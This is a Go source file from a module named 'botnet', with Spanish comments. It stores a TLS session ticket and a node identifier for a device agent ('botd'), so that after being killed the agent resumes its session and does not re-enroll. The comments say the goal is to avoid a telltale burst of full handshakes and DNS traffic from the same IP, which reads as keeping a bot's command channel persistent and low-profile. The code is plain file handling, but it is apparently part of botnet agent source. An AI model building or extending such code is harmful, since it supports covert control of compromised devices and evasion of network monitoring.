package tunnel

import (
	"errors"
	"os"

	"github.com/botnet/botnet/internal/state"
)

// ErrNodeIDCorrupt: node_id.bin con tamano ajeno a 16 B (flash corrompida
// o version antigua): el agente se re-enrola, no panica.
var ErrNodeIDCorrupt = errors.New("tunnel: node_id.bin corrupto")

// Estado persistido a traves de reinicios (T-1301, A1-03): el ticket TLS
// (FileSessionCache) y el node_id viven en /data/botd como ficheros 0600
// bajo presupuesto de 1 KiB. Revivir es retomar la sesion (PSK), no
// reinstalarla: sin esto, cada auto-kill publica una rafaga de handshake
// completo + DNS desde la misma IP.

const (
	TicketFile = "ticket.bin" // destino de FileSessionCache
	NodeIDFile = "node_id.bin"
	// NodeIDSize: el node_id del enroll viaja como [16]byte en el
	// heartbeat (pkg/proto); en disco son exactamente 16 B.
	NodeIDSize = 16
	// StateBudget: ticket.bin + node_id.bin juntos (AC1).
	StateBudget = state.BudgetBytes
)

// TicketStore persiste ticket + node_id sobre el kv plano de internal/state.
type TicketStore struct{ Disk *state.Disk }

// NewTicketStore abre (o crea) /data/botd/state del dispositivo.
func NewTicketStore(dir string) (*TicketStore, error) {
	d, err := state.NewDisk(dir)
	if err != nil {
		return nil, err
	}
	return &TicketStore{Disk: d}, nil
}

// SessionCache es la cache TLS persistida en ticket.bin: el mismo fichero
// que mide el criterio `wc -c`.
func (s *TicketStore) SessionCache() *FileSessionCache {
	return NewFileSessionCache(s.Disk.Path(TicketFile))
}

// SaveTicket persiste bytes de resolucion (ruta normal: FileSessionCache
// escribe solo; esto es el doble de asserts y de fixtures). Respeta el
// presupuesto: un ticket desbocado devuelve state.ErrBudget.
func (s *TicketStore) SaveTicket(b []byte) error {
	return s.Disk.Put(TicketFile, b)
}

// LoadTicket lee el ticket persistido; (nil,false,nil) si no existe.
func (s *TicketStore) LoadTicket() ([]byte, bool, error) {
	b, err := s.Disk.Get(TicketFile)
	if os.IsNotExist(err) {
		return nil, false, nil
	}
	return b, err == nil, err
}

// DeleteTicket modela el borrado manual del criterio 3.
func (s *TicketStore) DeleteTicket() error { return s.Disk.Delete(TicketFile) }

// HasTicket dice si hay ticket valido en disco.
func (s *TicketStore) HasTicket() bool { return s.Disk.Exists(TicketFile) }

// SaveNodeID fija el node_id (16 B) para que el revival no vuelva a
// enrollarse.
func (s *TicketStore) SaveNodeID(id [NodeIDSize]byte) error {
	return s.Disk.Put(NodeIDFile, id[:])
}

// LoadNodeID recupera el node_id; ok=false si aun no hay estado.
func (s *TicketStore) LoadNodeID() ([NodeIDSize]byte, bool, error) {
	var zero [NodeIDSize]byte
	b, err := s.Disk.Get(NodeIDFile)
	if os.IsNotExist(err) {
		return zero, false, nil
	}
	if err != nil {
		return zero, false, err
	}
	if len(b) != NodeIDSize {
		return zero, false, ErrNodeIDCorrupt
	}
	var id [NodeIDSize]byte
	copy(id[:], b)
	return id, true, nil
}

// StateBytes es el "wc -c" conjunto de ticket.bin + node_id.bin (AC1).
func (s *TicketStore) StateBytes() (int64, error) { return s.Disk.TotalSize() }

// FullHandshakeForRevival: sin ticket persistido, el siguiente revive hace
// 1 handshake completo y FileSessionCache re-permite el ticket (degradacion
// controlada, AC3); con ticket, revive con PSK (0 handshakes completos).
func (s *TicketStore) FullHandshakeForRevival() bool { return !s.HasTicket() }
